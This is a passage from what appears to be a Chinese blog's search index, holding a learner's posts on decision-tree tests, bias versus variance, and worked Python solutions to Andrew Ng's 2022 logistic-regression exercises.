np.concatenate((X, X_t.T), axis=1) left, right = target(X, list(range(5)), 2) expected = {'left': np.array([1, 3]), 'right': np.array([0, 2, 4])} assert type(left) == list, f\"Wrong type for left. Expected: list got: {type(left)}\" assert type(right) == list, f\"Wrong type for right. Expected: list got: {type(right)}\" assert type(left[0]) == int, f\"Wrong type for elements in the left list. Expected: int got: {type(left[0])}\" assert type(right[0]) == int, f\"Wrong type for elements in the right list. Expected: number got: {type(right[0])}\" assert len(left) == 2, f\"left must have 2 elements but got: {len(left)}\" assert len(right) == 3, f\"right must have 3 elements but got: {len(right)}\" assert np.allclose(right, expected['right']), f\"Wrong value for right. Expected: {expected['right']} \\ngot: {right}\" assert np.allclose(left, expected['left']), f\"Wrong value for left. Expected: {expected['left']} \\ngot: {left}\" X = np.array([[0, 1], [1, 1], [1, 1], [0, 0], [1, 0]]) X_t = np.array([[0, 1, 0, 1, 0]]) X = np.concatenate((X_t.T, X), axis=1) left, right = target(X, list(range(5)), 0) expected = {'left': np.array([1, 3]), 'right': np.array([0, 2, 4])} assert np.allclose(right, expected['right']) and np.allclose(left, expected[ 'left']), f\"Wrong value when target is at index 0.\" X = (np.random.rand(11, 3) \u003e 0.5) * 1 # Just random binary numbers X_t = np.array([[0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0]]) X = np.concatenate((X, X_t.T), axis=1) left, right = target(X, [1, 2, 3, 6, 7, 9, 10], 3) expected = {'left': np.array([1, 3, 6]), 'right': np.array([2, 7, 9, 10])} assert np.allclose(right, expected['right']) and np.allclose(left, expected[ 'left']), f\"Wrong value when target is at index 0. \\nExpected: {expected} \\ngot: \\{left:{left}, 'right': {right}\\}\" print(\"\\033[92m All tests passed.\") def compute_information_gain_test(target): X = np.array([[1, 0], [1, 0], [1, 0], [0, 0], [0, 1]]) y = np.array([[0, 0, 0, 0, 0]]).T node_indexes = list(range(5)) result1 = target(X, y, node_indexes, 0) result2 = target(X, y, node_indexes, 0) assert result1 == 0 and result2 == 0, f\"Information gain must be 0 when target variable is pure. Got {r","date":"2022-07-12","objectID":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/:3:0","tags":["决策树","深度学习入门","机器学习","Decision Tree"],"title":"初学决策树","uri":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/"},{"categories":["AI"],"content":" 本文主要参考别人的文章加入自己的话来帮助自己的理解，非原创哦 最近在学Andrew的Machine Learning课程，在学习欠拟合（under fitting）和过拟合（over-fitting接触到了高偏差（high bias）和高方差（high variance）的概念，很轻易的记住了： 过拟合–\u003e高方差 欠拟合–\u003e高偏差 的结论，但是对其中仍有许多不解，且Andrew举过他一个学生还是朋友的例子说高方差和高偏差需要很长时间去真正的理解，遂Google了一些文章帮助自己稍微理解这两个概念。 ","date":"2022-07-12","objectID":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/:0:0","tags":["方差","偏差","机器学习"],"title":"高偏差(high bias)和高方差(high variance)","uri":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/"},{"categories":["AI"],"content":"几个概念区分 ","date":"2022-07-12","objectID":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/:1:0","tags":["方差","偏差","机器学习"],"title":"高偏差(high bias)和高方差(high variance)","uri":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/"},{"categories":["AI"],"content":"模型 \u0026 训练模型 我们每次使用训练集训练出来一个\"模型\"(其实应该叫做训练模型，因为每次更换训练集，训练出的“模型”并不一样，即各个训练模型被训练出来的参数（系数）是不一样的) 我们不可能得到用于训练这个模型的所有数据，也就无法训练出使模型y=ax+b理论上100%正确的参数，所以我们只能得到不同的训练模型。 ","date":"2022-07-12","objectID":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/:1:1","tags":["方差","偏差","机器学习"],"title":"高偏差(high bias)和高方差(high variance)","uri":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/"},{"categories":["AI"],"content":"参数(parameter) \u0026 超参数(hyperparameter) 参数是被数据和算法训练出来的 而超参数（比如学习速率）不是被训练出来的，而是人为手工调整的。 调整超参数更像是一种艺术，而不是科学。 ","date":"2022-07-12","objectID":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/:1:2","tags":["方差","偏差","机器学习"],"title":"高偏差(high bias)和高方差(high variance)","uri":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/"},{"categories":["AI"],"content":"问题 既然我们永远无法训练出那个理想的模型，只能训练出训练模型，那么训练模型预测的结果和理论模型（即现实）的结果肯定就存在误差。我们肯定希望这个误差越小越好，并且将这个训练模型应用在其他数据集上的误差也是越小越好。那么问题来了，如果这个误差很大，我们该如何是好？ ","date":"2022-07-12","objectID":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/:2:0","tags":["方差","偏差","机器学习"],"title":"高偏差(high bias)和高方差(high variance)","uri":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/"},{"categories":["AI"],"content":"举例 该博主这个例子举得很好哈哈 假设我们要训练一个股票市场的模型，模型的目标是预测某支股票第2天的收益率，如果收益为正则买入，反之则卖出。我们的模型天天都想发财，它希望能准确预测每一天的涨跌，所以它关注的是第二天的收益，什么一年翻一倍之类的中长线策略它根本不关心。 A模型：阅读了大量的巴菲特，彼得林奇等等各种大师的书籍和数据，它发现买入低估值股票的收益很可观，于是每天满仓杀入估值最低的N支股票。没过几天，它亏成了狗。它去质问股神，股神曰：“你把投资想象的太简单了，除了看估值，我还看很多其他指标”。 B模型：吸取A模型的教训，它罗列了各种稀奇古怪的指标，最终惊喜的发现，模型成功的预测某支股票第二天的收益。万分惊喜下，它满仓杀入。第三天，第四天，第N天过去了，模型有时预测的准确，但大多时候谬之千里，还是亏成了🐶。 上面训练的2种模型，和我们期待的“神预测”模型有很大误差。我们要想减少预测误差，就要分析造成误差的原因。这里的误差包含： 偏差（bias）：我们要预测第二天的收益，而估值指标经常用于长线投资，虽然每次预测都是信誓旦旦，但是模型从本质上就把目标搞错了。 方差（variance）：过多的已知条件，导致模型无法给出确定的预测，预测结果和瞎蒙一样，给人的感觉是不靠谱。 无法消除的误差：我们都知道，完美预测第二天的情况，是不可能的。这样的误差难以消除，我们希望它越小越好，一般就忽略掉了。 所以，我们可以优化的误差=偏差+方差 ","date":"2022-07-12","objectID":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/:3:0","tags":["方差","偏差","机器学习"],"title":"高偏差(high bias)和高方差(high variance)","uri":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/"},{"categories":["AI"],"content":"打靶图 很经典的一张图（出处为第二个参考文献）： 图中每一个蓝点，都代表了一个训练模型的预测数据，即根据不同的训练集训练出一个训练模型，再用这个训练模型作出一次预测结果。如果将这个过程重复N次，相当于进行了N次射击。 我们假设真实的函数关系是Y=f(x)，而训练模型预测的结果是p(x)，则 偏差错误：偏差是衡量预测值和真实值的关系。即N次预测的平均值（也叫期望值），和实际真实值的差距。所以偏差bias=E(p(x)) - f(x)。即bias是指一个模型在不同训练集上的平均表现和真实值的差异，用来衡量一个模型的拟合能力。 方差错误：方差用于衡量预测值之间的关系，和真实值无关。即对于给定的某一个输入，N次预测结果之间的方差。variance= E((p(x) - E(p(x)))^2)。这个公式就是数学里的方差公式，反应的是统计量的离散程度。只不过，我们需要搞清楚我们计算的方差的意义，它反映的是不同训练模型针对同一个预测的离散程度。即variance指一个模型在不同训练集上的差异，用来衡量一个模型是否容易过拟合 打靶图的理解： 高偏差，低方差： 每次射击都很准确的击中同一个位置，故极端的情况方差为0。只不过，这个位置距离靶心相差了十万八千里。对于射击而言，每次都打到同一个点，很可能是因为它打的不是靶心。对于模型而言，往往是因为模型过于简单，才会造成“准”的假象。提高模型的复杂度，往往可以减少高偏差。 高方差，低偏差： 是不是偏差越低越好？是不是低偏差时，方差也会低呢？通过对偏差的定义，不难发现，偏差是一个期望值（平均值），如果一次射击偏左5环，另一次射击偏右5环，最终偏差是0。但是没一枪打中靶心，所以方差是巨大的，这种情况也是需要改进的。方差越大，预测结果的分布越离散 ","date":"2022-07-12","objectID":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/:3:1","tags":["方差","偏差","机器学习"],"title":"高偏差(high bias)和高方差(high variance)","uri":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/"},{"categories":["AI"],"content":"如何解决 一般来说，当一个模型在训练集上的错误率比较高时，说明模型的拟合能力不够，偏差较高。 欠拟合（高偏差）的解决办法： 增加数据特征 提高模型负责度 减少正则化系数 当模型在训练集上的错误率比较低，但验证集上错误率比较高时，说明模型过拟合，方差比较高。 过拟合（高方差）的解决方法： 减低模型复杂度 加大正则化系数 引入先验知识 使用集成模型，即通过多个高方差模型的平均来降低方差 ","date":"2022-07-12","objectID":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/:4:0","tags":["方差","偏差","机器学习"],"title":"高偏差(high bias)和高方差(high variance)","uri":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/"},{"categories":["AI"],"content":"如何判断 高偏差: 高方差: 在上述解决办法中提到了修改lamda值可以解决高偏差高方差问题，下图即是lamda值和两者之间的关系： ","date":"2022-07-12","objectID":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/:5:0","tags":["方差","偏差","机器学习"],"title":"高偏差(high bias)和高方差(high variance)","uri":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/"},{"categories":["AI"],"content":"参考文章 感谢博主的文章，受益匪浅： https://www.jianshu.com/p/a585d5506b1e http://scott.fortmann-roe.com/docs/BiasVariance.html ","date":"2022-07-12","objectID":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/:6:0","tags":["方差","偏差","机器学习"],"title":"高偏差(high bias)和高方差(high variance)","uri":"/%E9%AB%98%E5%81%8F%E5%B7%AE%E5%92%8C%E9%AB%98%E6%96%B9%E5%B7%AE/"},{"categories":["AI"],"content":"不带正则的 ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/:1:0","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习课后题-课程1week3-Logistic Regression","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/"},{"categories":["AI"],"content":"问题描述 Suppose that you are the administrator of a university department and you want to determine each applicant’s chance of admission based on their results on two exams. You have historical data from previous applicants that you can use as a training set for logistic regression. For each training example, you have the applicant’s scores on two exams and the admissions decision. Your task is to build a classification model that estimates an applicant’s probability of admission based on the scores from those two exams. ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/:1:1","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习课后题-课程1week3-Logistic Regression","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/"},{"categories":["AI"],"content":"sigmoid函数 the model: $$ f_{\\mathbf{w},b}(x) = g(\\mathbf{w}\\cdot \\mathbf{x} + b)$$ where function $g$ is the sigmoid function. The sigmoid function is defined as: $$g(z) = \\frac{1}{1+e^{-z}}$$ # UNQ_C1 # GRADED FUNCTION: sigmoid def sigmoid(z): \"\"\" Compute the sigmoid of z Args: z (ndarray): A scalar, numpy array of any size. Returns: g (ndarray): sigmoid(z), with the same shape as z \"\"\" ### START CODE HERE ### g = 1/(1 + np.exp(-z)) ### END SOLUTION ### return g print (\"sigmoid(0) = \" + str(sigmoid(0))) ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/:1:2","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习课后题-课程1week3-Logistic Regression","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/"},{"categories":["AI"],"content":"cost function cost function的式子： $$ J(\\mathbf{w},b) = \\frac{1}{m}\\sum_{i=0}^{m-1} \\left[ loss(f_{\\mathbf{w},b}(\\mathbf{x}^{(i)}), y^{(i)}) \\right] \\tag{1}$$ 其中单个数据集上的Loss为： $$loss(f_{\\mathbf{w},b}(\\mathbf{x}^{(i)}), y^{(i)}) = (-y^{(i)} \\log\\left(f_{\\mathbf{w},b}\\left( \\mathbf{x}^{(i)} \\right) \\right) - \\left( 1 - y^{(i)}\\right) \\log \\left( 1 - f_{\\mathbf{w},b}\\left( \\mathbf{x}^{(i)} \\right) \\right) \\tag{2}$$ 计算代价函数： # UNQ_C2 # GRADED FUNCTION: compute_cost def compute_cost(X, y, w, b, lambda_= 1): \"\"\" Computes the cost over all examples Args: X : (ndarray Shape (m,n)) data, m examples by n features y : (array_like Shape (m,)) target value w : (array_like Shape (n,)) Values of parameters of the model b : scalar Values of bias parameter of the model lambda_: unused placeholder Returns: total_cost: (scalar) cost \"\"\" m, n = X.shape ### START CODE HERE ### loss_sum = 0 # Loop over each training example for i in range(m): # First calculate z_wb = w[0]*X[i][0]+...+w[n-1]*X[i][n-1]+b z_wb = 0 # Loop over each feature for j in range(n): # Add the corresponding term to z_wb z_wb_ij = w[j]*X[i][j]# Your code here to calculate w[j] * X[i][j] z_wb += z_wb_ij # equivalent to z_wb = z_wb + z_wb_ij # Add the bias term to z_wb z_wb += b # equivalent to z_wb = z_wb + b f_wb = sigmoid(z_wb)# Your code here to calculate prediction f_wb for a training example # ? loss = -y[i] * np.log(f_wb) - (1 - y[i]) * np.log(1 - f_wb)# Your code here to calculate loss for a training example loss_sum += loss # equivalent to loss_sum = loss_sum + loss total_cost = (1 / m) * loss_sum ### END CODE HERE ### return total_cost ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/:1:3","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习课后题-课程1week3-Logistic Regression","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/"},{"categories":["AI"],"content":"梯度下降 def compute_gradient(X, y, w, b, lambda_=None): m, n = X.shape dj_dw = np.zeros(w.shape) dj_db = 0. ### START CODE HERE ### err = 0. for i in range(m): # Calculate f_wb (exactly as you did in the compute_cost function above) z_wb = 0 # Loop over each feature for j in range(n): # Add the corresponding term to z_wb z_wb_ij = X[i, j] * w[j] z_wb += z_wb_ij # Add bias term z_wb += b # Calculate the prediction from the model f_wb = sigmoid(z_wb) # Calculate the gradient for b from this example dj_db_i = f_wb - y[i]# Your code here to calculate the error # add that to dj_db dj_db += dj_db_i # get dj_dw for each attribute for j in range(n): # You code here to calculate the gradient from the i-th example for j-th attribute dj_dw_ij =(f_wb - y[i])* X[i][j] dj_dw[j] += dj_dw_ij # divide dj_db and dj_dw by total number of examples dj_dw = dj_dw / m dj_db = dj_db / m ### END CODE HERE ### return dj_db, dj_dw 梯度下降： def gradient_descent(X, y, w_in, b_in, cost_function, gradient_function, alpha, num_iters, lambda_): \"\"\" Performs batch gradient descent to learn theta. Updates theta by taking num_iters gradient steps with learning rate alpha Args: X : (array_like Shape (m, n) y : (array_like Shape (m,)) w_in : (array_like Shape (n,)) Initial values of parameters of the model b_in : (scalar) Initial value of parameter of the model cost_function: function to compute cost alpha : (float) Learning rate num_iters : (int) number of iterations to run gradient descent lambda_ (scalar, float) regularization constant Returns: w : (array_like Shape (n,)) Updated values of parameters of the model after running gradient descent b : (scalar) Updated value of parameter of the model after running gradient descent \"\"\" # number of training examples m = len(X) # An array to store cost J and w's at each iteration primarily for graphing later J_history = [] w_history = [] for i in range(num_iters): # Calculate the gradient and update the parameters dj_db, dj_dw = gradient_function(X, y, w_in, b_in, lambda_) # Update Parameters using w, b, alpha and gradient w_in = w_in - alpha * dj_dw b_in = b_in - alpha * dj_db # Save cost J at each iteration if i\u003c100000: # prevent resource exhaustion cost = cost_function(X, y, w_in, b_in, lambda_) J_history.append(cost) # Print cost every at intervals 10 times or as many iterations if \u003c 10 if i% math.ceil(num_iters/10) == 0 or i == (num_iters-1): w_history.append(w_in) print(f\"Iteration {i:4}: Cost {float(J_history[-1]):8.2f} \") return w_in, b_in, J_history, w_history #return w and J,w history for graphing ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/:1:4","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习课后题-课程1week3-Logistic Regression","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/"},{"categories":["AI"],"content":"预测 # UNQ_C4 # GRADED FUNCTION: predict def predict(X, w, b): \"\"\" Predict whether the label is 0 or 1 using learned logistic regression parameters w Args: X : (ndarray Shape (m, n)) w : (array_like Shape (n,)) Parameters of the model b : (scalar, float) Parameter of the model Returns: p: (ndarray (m,1)) The predictions for X using a threshold at 0.5 \"\"\" # number of training examples m, n = X.shape p = np.zeros(m) ### START CODE HERE ### # Loop over each example for i in range(m): z_wb = 0 # Loop over each feature for j in range(n): # Add the corresponding term to z_wb z_wb += X[i, j] * w[j] # Add bias term z_wb += b # Calculate the prediction for this example f_wb = sigmoid(z_wb) # Apply the threshold p[i] = f_wb \u003e= 0.5 ### END CODE HERE ### return p #Compute accuracy on our training set p = predict(X_train, w,b) print('Train Accuracy: %f'%(np.mean(p == y_train) * 100)) ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/:1:5","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习课后题-课程1week3-Logistic Regression","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/"},{"categories":["AI"],"content":"代码 \"\"\" \"\"\" import numpy as np import matplotlib.pyplot as plt from utils import * import copy import math def cat_data(): \"\"\" 查看训练数据 :return: \"\"\" print(\"First five elements in X_train are:\\n\", X_train[:5]) print(\"Type of X_train:\", type(X_train)) print(\"First five elements in y_train are:\\n\", y_train[:5]) print(\"Type of y_train:\", type(y_train)) print('The shape of X_train is: ' + str(X_train.shape)) print('The shape of x_dim is: ' + str(X_train.ndim)) print('The shape of y_train is: ' + str(y_train.shape)) print('We have m = %d training examples' % (len(y_train))) # Plot examples plot_data(X_train, y_train[:], pos_label=\"Admitted\", neg_label=\"Not admitted\") # Set the y-axis label plt.ylabel('Exam 2 score') # Set the x-axis label plt.xlabel('Exam 1 score') plt.legend(loc=\"upper right\") plt.show() # UNQ_C1 # GRADED FUNCTION: sigmoid def sigmoid(z): \"\"\" Compute the sigmoid of z Args: z (ndarray): A scalar, numpy array of any size. Returns: g (ndarray): sigmoid(z), with the same shape as z \"\"\" g = 1 / (1 + np.exp(-z)) return g # UNQ_C2 # GRADED FUNCTION: compute_cost def compute_cost(X, y, w, b, lambda_=1): \"\"\" Computes the cost over all examples Args: X : (ndarray Shape (m,n)) data, m examples by n features y : (array_like Shape (m,)) target value w : (array_like Shape (n,)) Values of parameters of the model b : scalar Values of bias parameter of the model lambda_: unused placeholder Returns: total_cost: (scalar) cost \"\"\" m, n = X.shape ### START CODE HERE ### loss_sum = 0 # Loop over each training example for i in range(m): # First calculate z_wb = w[0]*X[i][0]+...+w[n-1]*X[i][n-1]+b z_wb = 0 # Loop over each feature for j in range(n): # Add the corresponding term to z_wb z_wb_ij = w[j] * X[i][j] # Your code here to calculate w[j] * X[i][j] z_wb += z_wb_ij # equivalent to z_wb = z_wb + z_wb_ij # Add the bias term to z_wb z_wb += b # equivalent to z_wb = z_wb + b f_wb = sigmoid(z_wb) # Your code here to calculate prediction f_wb for a training example # 单个loss loss = -y[i] * np.log(f_wb) - (1 - y[i]) * np.log( 1 - f_wb) # Your code here to calculate loss for a training example loss_sum += loss # equivalent to loss_sum = loss_sum + loss total_cost = (1 / m) * loss_sum ### END CODE HERE ### return total_cost def compute_gradient(X, y, w, b, lambda_=None): m, n = X.shape dj_dw = np.zeros(w.shape) dj_db = 0. ### START CODE HERE ### err = 0. for i in range(m): # Calculate f_wb (exactly as you did in the compute_cost function above) z_wb = 0 # Loop over each feature for j in range(n): # Add the corresponding term to z_wb z_wb_ij = X[i, j] * w[j] z_wb += z_wb_ij # Add bias term z_wb += b # Calculate the prediction from the model f_wb = sigmoid(z_wb) # Calculate the gradient for b from this example dj_db_i = f_wb - y[i] # Your code here to calculate the error # add that to dj_db dj_db += dj_db_i # get dj_dw for each attribute for j in range(n): # You code here to calculate the gradient from the i-th example for j-th attribute dj_dw_ij =(f_wb - y[i])* X[i][j] dj_dw[j] += dj_dw_ij # divide dj_db and dj_dw by total number of examples dj_dw = dj_dw / m dj_db = dj_db / m ### END CODE HERE ### return dj_db, dj_dw def gradient_descent(X, y, w_in, b_in, cost_function, gradient_function, alpha, num_iters, lambda_): \"\"\" Performs batch gradient descent to learn theta. Updates theta by taking num_iters gradient steps with learning rate alpha Args: X : (array_like Shape (m, n) y : (array_like Shape (m,)) w_in : (array_like Shape (n,)) Initial values of parameters of the model b_in : (scalar) Initial value of parameter of the model cost_function: function to compute cost alpha : (float) Learning rate num_iters : (int) number of iterations to run gradient descent lambda_ (scalar, float) regularization constant Returns: w : (array_like Shape (n,)) Updated values of parameters of the model after running gradient descent b : (scalar) Updated value of parameter of the model after running gradient descent \"\"\" # number of training examples m = len(X) # An a","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/:1:6","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习课后题-课程1week3-Logistic Regression","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/"},{"categories":["AI"],"content":"带正则化的 问题描述： Suppose you are the product manager of the factory and you have the test results for some microchips on two different tests. From these two tests, you would like to determine whether the microchips should be accepted or rejected. To help you make the decision, you have a dataset of test results on past microchips, from which you can build a logistic regression model. \"\"\" Suppose you are the product manager of the factory and you have the test results for some microchips on two different tests. From these two tests, you would like to determine whether the microchips should be accepted or rejected. To help you make the decision, you have a dataset of test results on past microchips, from which you can build a logistic regression model. \"\"\" import numpy as np import matplotlib.pyplot as plt from utils import * import copy import math def cat_data(): # Plot examples plot_data(X_train, y_train[:], pos_label=\"Accepted\", neg_label=\"Rejected\") # Set the y-axis label plt.ylabel('Microchip Test 2') # Set the x-axis label plt.xlabel('Microchip Test 1') plt.legend(loc=\"upper right\") plt.show() def map_feature(X1, X2): \"\"\" Feature mapping function to polynomial features we will map the features into all polynomial terms of 𝑥1 and 𝑥2 up to the sixth power. \"\"\" X1 = np.atleast_1d(X1) X2 = np.atleast_1d(X2) degree = 6 out = [] for i in range(1, degree+1): for j in range(i + 1): out.append((X1**(i-j) * (X2**j))) return np.stack(out, axis=1) # UNQ_C1 # GRADED FUNCTION: sigmoid def sigmoid(z): \"\"\" Compute the sigmoid of z Args: z (ndarray): A scalar, numpy array of any size. Returns: g (ndarray): sigmoid(z), with the same shape as z \"\"\" ### START CODE HERE ### g = 1 / (1 + np.exp(-z)) ### END SOLUTION ### return g # UNQ_C2 # GRADED FUNCTION: compute_cost def compute_cost(X, y, w, b, lambda_=1): \"\"\" Computes the cost over all examples Args: X : (ndarray Shape (m,n)) data, m examples by n features y : (array_like Shape (m,)) target value w : (array_like Shape (n,)) Values of parameters of the model b : scalar Values of bias parameter of the model lambda_: unused placeholder Returns: total_cost: (scalar) cost \"\"\" m, n = X.shape ### START CODE HERE ### loss_sum = 0 # Loop over each training example for i in range(m): # First calculate z_wb = w[0]*X[i][0]+...+w[n-1]*X[i][n-1]+b z_wb = 0 # Loop over each feature for j in range(n): # Add the corresponding term to z_wb z_wb_ij = w[j] * X[i][j] # Your code here to calculate w[j] * X[i][j] z_wb += z_wb_ij # equivalent to z_wb = z_wb + z_wb_ij # Add the bias term to z_wb z_wb += b # equivalent to z_wb = z_wb + b f_wb = sigmoid(z_wb) # Your code here to calculate prediction f_wb for a training example # ? loss = -y[i] * np.log(f_wb) - (1 - y[i]) * np.log( 1 - f_wb) # Your code here to calculate loss for a training example loss_sum += loss # equivalent to loss_sum = loss_sum + loss total_cost = (1 / m) * loss_sum ### END CODE HERE ### return total_cost # UNQ_C5 def compute_cost_reg(X, y, w, b, lambda_=1): \"\"\" 计算正则项 Computes the cost over all examples Args: X : (array_like Shape (m,n)) data, m examples by n features y : (array_like Shape (m,)) target value w : (array_like Shape (n,)) Values of parameters of the model b : (array_like Shape (n,)) Values of bias parameter of the model lambda_ : (scalar, float) Controls amount of regularization Returns: total_cost: (scalar) cost \"\"\" m, n = X.shape # Calls the compute_cost function that you implemented above cost_without_reg = compute_cost(X, y, w, b) # You need to calculate this value reg_cost = 0. ### START CODE HERE ### for j in range(n): reg_cost_j = w[j] ** 2 # Your code here to calculate the cost from w[j] reg_cost = reg_cost + reg_cost_j ### END CODE HERE ### # Add the regularization cost to get the total cost total_cost = cost_without_reg + (lambda_ / (2 * m)) * reg_cost return total_cost def compute_gradient(X, y, w, b, lambda_=None): m, n = X.shape dj_dw = np.zeros(w.shape) dj_db = 0. ### START CODE HERE ### err = 0. for i in range(m): # Calc","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/:2:0","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习课后题-课程1week3-Logistic Regression","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week3-logistic-regression/"},{"categories":["AI"],"content":"逻辑回归 实际上用于分类问题中（不要被名字迷惑），其输出值在0-1之间 